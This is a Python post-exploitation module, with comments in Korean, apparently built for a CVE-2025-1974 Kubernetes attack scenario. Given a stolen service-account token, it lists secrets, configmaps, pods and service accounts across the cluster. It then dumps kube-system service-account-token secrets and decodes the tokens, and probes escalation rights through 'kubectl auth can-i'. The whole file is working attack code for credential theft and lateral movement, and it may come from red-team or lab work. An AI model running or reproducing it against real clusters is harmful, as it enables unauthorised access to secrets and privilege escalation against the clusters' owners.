"""
Kubernetes API Lateral Movement 모듈 — CVE-2025-1974 시나리오 C

탈취한 SA 토큰으로 Kubernetes API에 접근하여 클러스터 내 정보를 수집하고
권한 상승 가능 여부를 확인한다.

Level 1: 정보 수집 (secrets/configmaps/pods/serviceaccounts 목록)
Level 2: 다른 SA 토큰 탈취 시도 (service-account-token 타입 시크릿 디코딩)
Level 3: 권한 상승 확인 (can-i, 실제 실행 없음)
"""

import json
import subprocess
from dataclasses import dataclass, field


@dataclass
class LateralResult:
    level: int
    success: bool
    details: dict = field(default_factory=dict)
    error: str = ""


def _kubectl_token(args: list[str], token: str) -> tuple[str, bool]:
    """kubectl --token=<token> <args> 실행. (stdout, success) 반환."""
    cmd = ["kubectl", f"--token={token}"] + args
    try:
        out = subprocess.check_output(cmd, stderr=subprocess.PIPE, timeout=15).decode()
        return out.strip(), True
    except subprocess.CalledProcessError as e:
        return e.stderr.decode().strip(), False
    except Exception as e:
        return str(e), False


def level1_info_gather(token: str) -> LateralResult:
    """탈취한 SA 토큰으로 클러스터 정보를 수집한다."""
    resources = {
        "secrets": ["get", "secrets", "-A", "--no-headers"],
        "configmaps": ["get", "configmaps", "-A", "--no-headers"],
        "pods": ["get", "pods", "-A", "--no-headers"],
        "serviceaccounts": ["get", "serviceaccounts", "-A", "--no-headers"],
    }

    details: dict = {}
    any_success = False

    for name, args in resources.items():
        out, ok = _kubectl_token(args, token)
        if ok:
            lines = [l for l in out.splitlines() if l.strip()]
            details[name] = {
                "count": len(lines),
                "sample": lines[:5],
            }
            any_success = True
        else:
            details[name] = {"error": out[:200]}

    return LateralResult(level=1, success=any_success, details=details)


def level2_steal_other_tokens(token: str) -> LateralResult:
    """
    kube-system 네임스페이스의 시크릿 중 service-account-token 타입을 찾아
    토큰 데이터를 base64 디코딩한다.
    """
    import base64

    out, ok = _kubectl_token(
        ["get", "secrets", "-n", "kube-system", "-o", "json"], token
    )
    if not ok:
        return LateralResult(level=2, success=False, error=out[:300])

    try:
        data = json.loads(out)
    except Exception:
        return LateralResult(level=2, success=False, error="JSON 파싱 실패")

    found_tokens: list[dict] = []
    for item in data.get("items", []):
        if item.get("type") != "kubernetes.io/service-account-token":
            continue
        secret_name = item.get("metadata", {}).get("name", "")
        sa = item.get("metadata", {}).get("annotations", {}).get(
            "kubernetes.io/service-account.name", ""
        )
        raw_token_b64 = item.get("data", {}).get("token", "")
        if raw_token_b64:
            try:
                decoded = base64.b64decode(raw_token_b64).decode()
                found_tokens.append({
                    "secret_name": secret_name,
                    "sa_name": sa,
                    "token_preview": decoded[:60] + "...",
                })
            except Exception:
                pass

    return LateralResult(
        level=2,
        success=bool(found_tokens),
        details={"found_tokens": found_tokens, "count": len(found_tokens)},
    )


def level3_privilege_escalation(token: str) -> LateralResult:
    """
    kubectl auth can-i 로 고권한 동작 가능 여부를 확인한다.
    실제 실행 없이 can-i 결과만 기록한다.
    """
    checks = [
        (["auth", "can-i", "create", "pods", "-n", "kube-system"],        "create pods (kube-system)"),
        (["auth", "can-i", "create", "clusterrolebindings"],              "create clusterrolebindings"),
        (["auth", "can-i", "get",    "secrets", "-n", "kube-system"],     "get secrets (kube-system)"),
        (["auth", "can-i", "create", "pods", "--all-namespaces"],         "create pods (all ns)"),
        (["auth", "can-i", "list",   "secrets", "--all-namespaces"],      "list secrets (all ns)"),
        (["auth", "can-i", "impersonate", "serviceaccounts"],             "impersonate serviceaccounts"),
    ]

    can_i: dict = {}
    any_yes = False

    for args, label in checks:
        out, ok = _kubectl_token(args, token)
        result = out.strip().lower().startswith("yes") if ok else "error"
        can_i[label] = "yes" if result is True else ("no" if result is False else "error")
        if result is True:
            any_yes = True

    return LateralResult(
        level=3,
        success=any_yes,
        details={"can_i": can_i},
    )


def run_lateral_movement(
    token: str,
    levels: list[int] | None = None,
) -> list[LateralResult]:
    """
    지정된 levels를 순차 실행한다.
    각 레벨은 독립 실행 — 상위 레벨 실패가 하위 레벨을 중단하지 않는다.
    """
    if levels is None:
        levels = [1, 2, 3]

    dispatch = {
        1: level1_info_gather,
        2: level2_steal_other_tokens,
        3: level3_privilege_escalation,
    }

    results: list[LateralResult] = []
    for lvl in levels:
        if lvl in dispatch:
            results.append(dispatch[lvl](token))

    return results
